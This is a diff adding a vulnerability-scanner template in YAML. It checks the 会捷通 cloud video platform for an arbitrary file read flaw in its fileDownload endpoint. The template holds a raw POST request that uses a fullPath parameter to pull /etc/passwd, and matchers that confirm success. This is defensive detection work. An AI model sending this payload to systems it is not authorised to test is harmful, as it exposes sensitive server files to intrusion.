@@ -1,0 +1,29 @@
+id: huijietong-cloud-video-arbitrary-file-read
+info:
+  name: 会捷通云视讯 fileDownload 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        POST /fileDownload?action=downloadBackupFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fullPath=%2Fetc%2Fpasswd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/bin/bash"
+          - "/sbin/nologin"
+      - type: word
+        part: header
+        words:
+          - "multipart/form-data"
